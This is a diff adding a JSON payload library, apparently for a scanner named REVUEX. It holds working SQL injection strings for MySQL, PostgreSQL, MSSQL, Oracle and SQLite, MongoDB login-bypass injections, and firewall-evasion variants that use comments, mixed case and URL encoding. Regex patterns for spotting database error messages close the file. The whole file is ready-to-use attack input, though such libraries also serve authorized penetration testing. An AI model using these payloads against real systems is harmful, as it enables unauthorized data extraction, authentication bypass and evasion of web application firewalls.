@@ -1,0 +1,165 @@
+{
+  "description": "REVUEX SQL Injection Payload Library",
+  "version": "2.0",
+  "payloads": {
+    "mysql": {
+      "time_based": [
+        "' AND SLEEP(5)--",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "' UNION SELECT NULL,SLEEP(5)--",
+        "1' AND SLEEP(5) AND '1'='1",
+        "1 AND SLEEP(5)",
+        "'; WAITFOR DELAY '00:00:05'--"
+      ],
+      "boolean_based": [
+        "' AND '1'='1",
+        "' AND '1'='2",
+        "' OR '1'='1",
+        "1' AND 1=1--",
+        "1' AND 1=2--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT 1,2,3--",
+        "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+        "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns--"
+      ],
+      "error_based": [
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--"
+      ]
+    },
+    "postgresql": {
+      "time_based": [
+        "'; SELECT pg_sleep(5)--",
+        "1' AND 1=(SELECT 1 FROM pg_sleep(5))--",
+        "' || (SELECT pg_sleep(5))--"
+      ],
+      "boolean_based": [
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR 1=1--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT version(),NULL,NULL--",
+        "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--"
+      ]
+    },
+    "mssql": {
+      "time_based": [
+        "'; WAITFOR DELAY '00:00:05'--",
+        "1'; WAITFOR DELAY '00:00:05'--",
+        "' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)--"
+      ],
+      "boolean_based": [
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR 1=1--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT @@version,NULL,NULL--",
+        "' UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype='U'--"
+      ]
+    },
+    "oracle": {
+      "time_based": [
+        "' AND DBMS_LOCK.SLEEP(5)--",
+        "' || DBMS_LOCK.SLEEP(5)--",
+        "1' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0--"
+      ],
+      "boolean_based": [
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR 1=1--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL FROM dual--",
+        "' UNION SELECT banner,NULL,NULL FROM v$version--",
+        "' UNION SELECT NULL,table_name,NULL FROM all_tables--"
+      ]
+    },
+    "sqlite": {
+      "time_based": [
+        "' AND (SELECT COUNT(*) FROM sqlite_master) > (SELECT randomblob(100000000))--",
+        "1' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master AS t2) > 0--"
+      ],
+      "boolean_based": [
+        "' AND 1=1--",
+        "' AND 1=2--",
+        "' OR 1=1--"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL--",
+        "' UNION SELECT sqlite_version(),NULL,NULL--",
+        "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'--"
+      ]
+    },
+    "nosql": {
+      "mongodb": [
+        "{\"$gt\": \"\"}",
+        "{\"$ne\": null}",
+        "{\"$regex\": \".*\"}",
+        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+        "'; return true; var dummy='",
+        "'; this.password != '",
+        "{\"username\": {\"$regex\": \"^admin\"}, \"password\": {\"$ne\": \"\"}}"
+      ]
+    },
+    "waf_bypass": {
+      "comment_injection": [
+        "'/**/AND/**/SLEEP(5)--",
+        "'/*!50000AND*/SLEEP(5)--",
+        "'/**/UNION/**/SELECT/**/NULL--"
+      ],
+      "case_variation": [
+        "' AnD SLEEP(5)--",
+        "' UnIoN SeLeCt NULL--",
+        "' oR '1'='1"
+      ],
+      "encoding": [
+        "%27%20AND%20SLEEP(5)--",
+        "\\u0027 AND SLEEP(5)--",
+        "%2527 AND SLEEP(5)--"
+      ],
+      "whitespace": [
+        "'%09AND%09SLEEP(5)--",
+        "'%0aAND%0aSLEEP(5)--",
+        "'%0dAND%0dSLEEP(5)--"
+      ]
+    }
+  },
+  "detection_patterns": {
+    "mysql_errors": [
+      "You have an error in your SQL syntax",
+      "mysql_fetch",
+      "MySQL server version",
+      "supplied argument is not a valid MySQL"
+    ],
+    "postgresql_errors": [
+      "PostgreSQL.*ERROR",
+      "Warning.*pg_",
+      "valid PostgreSQL result",
+      "Npgsql."
+    ],
+    "mssql_errors": [
+      "Driver.*SQL Server",
+      "OLE DB.*SQL Server",
+      "SQLServer JDBC Driver",
+      "Microsoft SQL Native Client error"
+    ],
+    "oracle_errors": [
+      "ORA-[0-9]+",
+      "Oracle error",
+      "Oracle.*Driver",
+      "Warning.*oci_"
+    ],
+    "sqlite_errors": [
+      "SQLite/JDBCDriver",
+      "SQLite.Exception",
+      "System.Data.SQLite.SQLiteException"
+    ]
+  }
+}
